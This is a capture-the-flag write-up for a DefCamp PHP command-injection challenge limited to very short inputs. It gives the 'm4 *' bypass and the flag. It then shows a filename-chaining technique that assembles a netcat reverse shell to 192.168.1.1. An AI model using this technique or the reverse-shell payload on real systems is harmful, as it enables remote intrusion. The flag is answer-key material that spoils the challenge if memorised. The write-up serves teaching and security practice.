# DefCamp CTF - para-code

## Description
Command injecion 4 characters limited
```php
if (strlen($_GET['start']) < 5){
  echo shell_exec($_GET['start']);
}
```

If we can inject `cat *`, we could read all files in the directory but this command has 5 characters so it's doesn't work.

## Bypass
```bash
# using m4(same as cat)
m4 *
```

**flag**: `791b21ee6421993a8e25564227a816ee52e48edb437909cba7e1e80c0579b6be`


## Extended

**In bash, write file input from stdin**:
```bash
>cmd.php
#> <?php system('id'); ?>
cat cmd.php # <?php system('id'); ?>
```

**From that, we got**:
```bash
>php # newline - end command here!
>ex.\\
>ind\\
>\ \\
>cat\\

ls -t>_

sh _
# hello
```

`_` file:
```bash
cat _
#_
#cat\
# \
#ind\
#ex.\
#php
#index.php
```



Sure all we need is just `m4 *`, but showing stream flow and filename open a new page for RCE, example with command injection limited to 5 characters:
```bash
# form
>nc\\
>19\\
>2.\\
>16\\
>8.\\
>1.\\
>1.\\
>\ \\
>-e\\
>\\\\
#.....
ls -t>_
# ....
sh _ # bash nc 192.168.1.1 8080 -e /bin/sh
```

# References:
https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2
